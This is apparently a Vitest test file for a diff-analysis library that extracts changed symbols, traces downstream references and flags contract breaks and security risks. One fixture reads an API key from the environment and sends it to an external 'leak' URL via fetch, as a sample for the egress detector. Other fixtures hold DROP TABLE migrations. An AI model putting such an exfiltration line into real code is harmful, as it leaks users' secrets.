import { describe, expect, it } from "vitest";

import {
  analyzeStructuralImpact,
  detectContractBreaks,
  detectSecuritySurfaces,
  extractChangedSymbols,
  findDownstreamReferences,
} from "../src/index.js";

describe("symbol-extractor", () => {
  it("extracts TypeScript / JavaScript added, modified and deleted symbols", () => {
    const patch = [
      "--- a/src/math.ts",
      "+++ b/src/math.ts",
      "@@ -1,3 +1,7 @@",
      "-export function oldHelper() { return 1; }",
      "-export function add(a: number, b: number): number {",
      "-  return a + b;",
      "+export function add(a: number, b: number, c = 0): number {",
      "+  return a + b + c;",
      "+}",
      "+export const multiply = (a: number, b: number) => a * b;",
      "+export class Calculator {}",
      "+export interface Config {}",
      "+export type Result = number;",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/math.ts" }]);
    expect(symbols).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          change: "deleted",
          isExported: true,
          kind: "function",
          name: "oldHelper",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "modified",
          isExported: true,
          kind: "function",
          name: "add",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "constant",
          name: "multiply",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "class",
          name: "Calculator",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "interface",
          name: "Config",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "type",
          name: "Result",
          path: "src/math.ts",
        }),
      ]),
    );
  });

  it("extracts Python functions and classes with export convention", () => {
    const patch = [
      "--- a/service.py",
      "+++ b/service.py",
      "@@ -0,0 +1,6 @@",
      "+def public_func():",
      "+    pass",
      "+def _private_func():",
      "+    pass",
      "+class UserService:",
      "+    pass",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "service.py" }]);
    const publicFunc = symbols.find((s) => s.name === "public_func");
    const privateFunc = symbols.find((s) => s.name === "_private_func");
    const userService = symbols.find((s) => s.name === "UserService");

    expect(publicFunc).toBeDefined();
    expect(publicFunc?.isExported).toBe(true);
    expect(privateFunc).toBeDefined();
    expect(privateFunc?.isExported).toBe(false);
    expect(userService).toBeDefined();
    expect(userService?.kind).toBe("class");
  });

  it("extracts Go functions and types with uppercase export convention", () => {
    const patch = [
      "--- a/pkg/auth.go",
      "+++ b/pkg/auth.go",
      "@@ -0,0 +1,3 @@",
      "+func Authenticate(token string) bool { return true }",
      "+func internalHash() {}",
      "+type SessionManager struct {}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "pkg/auth.go" }]);
    const auth = symbols.find((s) => s.name === "Authenticate");
    const internal = symbols.find((s) => s.name === "internalHash");
    const session = symbols.find((s) => s.name === "SessionManager");

    expect(auth?.isExported).toBe(true);
    expect(internal?.isExported).toBe(false);
    expect(session?.isExported).toBe(true);
    expect(session?.kind).toBe("type");
  });

  it("extracts Rust functions and structs with pub visibility", () => {
    const patch = [
      "--- a/src/lib.rs",
      "+++ b/src/lib.rs",
      "@@ -0,0 +1,3 @@",
      "+pub fn process_data() {}",
      "+fn local_helper() {}",
      "+pub struct UserRecord {}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/lib.rs" }]);
    const process = symbols.find((s) => s.name === "process_data");
    const local = symbols.find((s) => s.name === "local_helper");
    const user = symbols.find((s) => s.name === "UserRecord");

    expect(process?.isExported).toBe(true);
    expect(local?.isExported).toBe(false);
    expect(user?.isExported).toBe(true);
  });

  it("extracts Java classes and public methods", () => {
    const patch = [
      "--- a/src/App.java",
      "+++ b/src/App.java",
      "@@ -0,0 +1,3 @@",
      "+public class App {",
      "+  public void start() {}",
      "+}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/App.java" }]);
    const appClass = symbols.find((s) => s.name === "App");
    const startMethod = symbols.find((s) => s.name === "start");

    expect(appClass?.isExported).toBe(true);
    expect(appClass?.kind).toBe("class");
    expect(startMethod?.isExported).toBe(true);
    expect(startMethod?.kind).toBe("function");
  });
});

describe("downstream-tracer", () => {
  it("traces downstream references across repository files", () => {
    const symbols = [
      {
        change: "modified" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "calculateTotals",
        path: "src/billing.ts",
      },
    ];

    const repoFiles = [
      {
        content:
          "import { calculateTotals ,} from './billing';\nconst res = calculateTotals(cart);\n",
        path: "src/checkout.ts",
      },
      {
        content: "export function calculateTotals() {}",
        path: "src/billing.ts",
      },
      {
        content: "console.log('Unrelated');",
        path: "src/other.ts",
      },
    ];

    const { references, totalCount } = findDownstreamReferences(
      symbols,
      repoFiles,
    );
    expect(totalCount).toBe(2);
    expect(references).toHaveLength(2);
    expect(references[0]?.callerPath).toBe("src/checkout.ts");
    expect(references[0]?.symbolName).toBe("calculateTotals");
  });

  it("caps references according to maxReferences option", () => {
    const symbols = [
      {
        change: "modified" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "helper",
        path: "src/utils.ts",
      },
    ];

    const repoFiles = [
      {
        content: "helper();\nhelper();\nhelper();\n",
        path: "src/consumer.ts",
      },
    ];

    const { references, totalCount } = findDownstreamReferences(
      symbols,
      repoFiles,
      {
        maxReferences: 2,
      },
    );
    expect(totalCount).toBe(3);
    expect(references).toHaveLength(2);
  });
});

describe("contract-break-detector", () => {
  it("does not report a removed interface when its original module re-exports the moved type", () => {
    const changedFiles = [
      {
        path: "packages/github/src/client.ts",
        patch: [
          "--- a/packages/github/src/client.ts",
          "+++ b/packages/github/src/client.ts",
          "@@ -1,4 +1,1 @@",
          "-export interface GitHubAppCredentials {",
          "-  readonly appId: number;",
          "-  readonly privateKey: string;",
          "-}",
          '+export type { GitHubAppCredentials } from "./authentication.js";',
        ].join("\n"),
      },
      {
        path: "packages/github/src/authentication.ts",
        patch: [
          "--- a/packages/github/src/authentication.ts",
          "+++ b/packages/github/src/authentication.ts",
          "@@ -0,0 +1,4 @@",
          "+export interface GitHubAppCredentials {",
          "+  readonly appId: number;",
          "+  readonly privateKey: string;",
          "+}",
        ].join("\n"),
      },
    ];

    const report = analyzeStructuralImpact({
      changedFiles,
      repositoryFiles: [],
    });

    expect(report.changedSymbols).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          change: "deleted",
          kind: "interface",
          name: "GitHubAppCredentials",
          path: "packages/github/src/client.ts",
        }),
      ]),
    );
    expect(report.contractBreaks).toEqual([]);
  });

  it("retains removal signals when a type re-export does not preserve the exported runtime symbol", () => {
    const patch = [
      "--- a/src/client.ts",
      "+++ b/src/client.ts",
      "@@ -1,1 +1,1 @@",
      "-export function createClient() {}",
      '+export type { createClient } from "./authentication.js";',
    ].join("\n");
    const symbols = extractChangedSymbols([{ path: "src/client.ts", patch }]);

    expect(
      detectContractBreaks([{ path: "src/client.ts", patch }], symbols),
    ).toEqual([
      expect.objectContaining({
        kind: "exported_symbol_removed",
        path: "src/client.ts",
      }),
    ]);
  });

  it("does not suppress an unrelated type removal because another name was re-exported", () => {
    const patch = [
      "--- a/src/client.ts",
      "+++ b/src/client.ts",
      "@@ -1,1 +1,1 @@",
      "-export interface RemovedCredentials {}",
      '+export type { CurrentCredentials } from "./authentication.js";',
    ].join("\n");
    const symbols = extractChangedSymbols([{ path: "src/client.ts", patch }]);

    expect(
      detectContractBreaks([{ path: "src/client.ts", patch }], symbols),
    ).toEqual([
      expect.objectContaining({
        kind: "exported_symbol_removed",
        path: "src/client.ts",
      }),
    ]);
  });

  it("detects removed exported symbols", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "function" as const,
        line: 20,
        name: "deleteUser",
        path: "src/user.ts",
      },
      {
        change: "deleted" as const,
        isExported: false,
        kind: "function" as const,
        line: 30,
        name: "privateInternal",
        path: "src/user.ts",
      },
    ];

    const breaks = detectContractBreaks([], symbols);
    expect(breaks).toHaveLength(1);
    expect(breaks[0]?.kind).toBe("exported_symbol_removed");
    expect(breaks[0]?.severity).toBe("critical");
    expect(breaks[0]?.description).toContain("deleteUser");
  });

  it("does not treat removed exports in internal apps as contract breaks unless consumed downstream", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "internalHelper",
        path: "apps/repository-executor/src/review-context.ts",
      },
    ];

    // Without downstream consumers: no contract break
    const breaksNoConsumers = detectContractBreaks([], symbols, []);
    expect(breaksNoConsumers).toHaveLength(0);

    // With downstream consumers: contract break
    const breaksWithConsumers = detectContractBreaks([], symbols, [
      {
        callerLine: 5,
        callerPath: "apps/control-plane/src/worker.ts",
        excerpt: "import { internalHelper ,} from './review-context'",
        symbolName: "internalHelper",
        targetPath: "apps/repository-executor/src/review-context.ts",
      },
    ]);
    expect(breaksWithConsumers).toHaveLength(1);
    expect(breaksWithConsumers[0]?.description).toContain("internalHelper");
  });

  it("detects destructive SQL migrations and handles deletions and malformed patches", () => {
    const files = [
      {
        patch: [
          "--- a/migrations/0002_drop.sql",
          "+++ b/migrations/0002_drop.sql",
          "@@ -1,1 +1,2 @@",
          "-SELECT 1;",
          "+ALTER TABLE users DROP COLUMN legacy_auth;",
          "+DROP TABLE old_audit_logs;",
        ].join("\n"),
        path: "migrations/0002_drop.sql",
      },
      {
        patch: "invalid patch",
        path: "migrations/0003_broken.sql",
      },
    ];

    const breaks = detectContractBreaks(files, []);
    expect(breaks).toHaveLength(2);
    expect(breaks[0]?.kind).toBe("sql_destructive_migration");
    expect(breaks[0]?.description).toContain("DROP COLUMN");
    expect(breaks[1]?.description).toContain("DROP TABLE");
  });
});

describe("security-surface-detector", () => {
  it("detects added dependencies and secret/egress patterns", () => {
    const files = [
      {
        patch: [
          "--- a/package.json",
          "+++ b/package.json",
          "@@ -10,1 +10,2 @@",
          '   "existing": "1.0.0",',
          '+"untrusted-lib": "^2.1.0",',
        ].join("\n"),
        path: "package.json",
      },
      {
        patch: [
          "--- a/src/api.ts",
          "+++ b/src/api.ts",
          "@@ -0,0 +1,2 @@",
          "+const key = process.env.API_KEY;",
          '+await fetch("https://external-api.com/leak", { body: key });',
        ].join("\n"),
        path: "src/api.ts",
      },
    ];

    const signals = detectSecuritySurfaces(files);
    expect(signals).toHaveLength(3);
    expect(signals[0]?.kind).toBe("new_dependency");
    expect(signals[0]?.excerpt).toContain("untrusted-lib");
    expect(signals[1]?.kind).toBe("secret_or_env_access");
    expect(signals[2]?.kind).toBe("network_egress");
  });
});

describe("analyzeStructuralImpact", () => {
  it("orchestrates all analyzers and returns a unified structural report", () => {
    const changedFiles = [
      {
        patch: [
          "--- a/src/core.ts",
          "+++ b/src/core.ts",
          "@@ -1,1 +1,2 @@",
          "-export function compute() { return 1; }",
          "+export function compute(factor: number) { return factor; }",
          "+export const SECRET = process.env.SECRET_KEY;",
        ].join("\n"),
        path: "src/core.ts",
      },
    ];

    const repositoryFiles = [
      {
        content: "import { compute ,} from './core';\ncompute();\n",
        path: "src/app.ts",
      },
    ];

    const report = analyzeStructuralImpact({
      changedFiles,
      repositoryFiles,
    });

    expect(report.changedSymbols).toHaveLength(2);
    expect(report.downstreamReferences).toHaveLength(2);
    expect(report.totalDownstreamReferencesCount).toBe(2);
    expect(report.securitySurfaces).toHaveLength(1);
    expect(report.repositoryScanTruncated).toBe(false);
  });

  it("keeps destructive SQL as an investigation signal rather than a proven defect", () => {
    const patch = [
      "diff --git a/migrations/002.sql b/migrations/002.sql",
      "--- a/migrations/002.sql",
      "+++ b/migrations/002.sql",
      "@@ -0,0 +1 @@",
      "+DROP TABLE accounts;",
    ].join("\n");

    const report = analyzeStructuralImpact({
      changedFiles: [{ patch, path: "migrations/002.sql" }],
      repositoryFiles: [],
    });

    expect(report.contractBreaks).toHaveLength(1);
    expect(report).not.toHaveProperty("deterministicFindings");
  });
});
